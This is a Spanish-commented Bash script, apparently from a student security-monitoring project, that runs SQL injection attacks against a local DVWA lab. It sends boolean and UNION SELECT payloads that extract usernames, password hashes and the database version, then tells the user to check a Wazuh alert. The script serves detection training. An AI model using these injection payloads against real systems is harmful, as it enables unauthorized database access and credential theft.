#!/usr/bin/env bash
# =============================================================================
# Proyecto 2 - Mini SOC TiendaCR - Ataque 3: Inyeccion SQL
# Ejecutar SOLO desde Kali contra el laboratorio propio. MITRE ATT&CK T1190
# =============================================================================
TARGET="${TARGET:-192.168.56.10}"; CJ=/tmp/dvwa-cookies.txt
echo "[1/3] Login en DVWA (nivel low) para obtener cookie..."
TOKEN=$(curl -s -c "$CJ" "http://$TARGET/login.php" | grep -oP "user_token' value='\K[^']+")
curl -s -b "$CJ" -c "$CJ" -d "username=admin&password=password&Login=Login&user_token=$TOKEN" "http://$TARGET/login.php" -o /dev/null
inj() { curl -s -b "$CJ" -b "security=low" -G "http://$TARGET/vulnerabilities/sqli/" --data-urlencode "id=$1" --data-urlencode "Submit=Submit"; }
echo "[2/3] Enviando inyecciones -- $(date '+%H:%M:%S')"
echo "  (a) Boolean 1' OR '1'='1 :"
inj "1' OR '1'='1" | sed 's/<[^>]*>/ /g' | grep -oE "First name: +[^ ]+ +Surname: +[^ ]+" | head -3
echo "  (b) UNION -> usuarios y hashes:"
inj "1' UNION SELECT user, password FROM users-- -" | sed 's/<[^>]*>/ /g' | grep -oE "First name: +[^ ]+ +Surname: +[a-f0-9]{32}"
echo "  (c) UNION -> version de la BD:"
inj "1' UNION SELECT null, version()-- -" | sed 's/<[^>]*>/ /g' | grep -oE "Surname: +[0-9][^ ]*" | head -1
echo "[3/3] Verificar en Wazuh: rule.id:100120 and data.srcip:192.168.56.30"
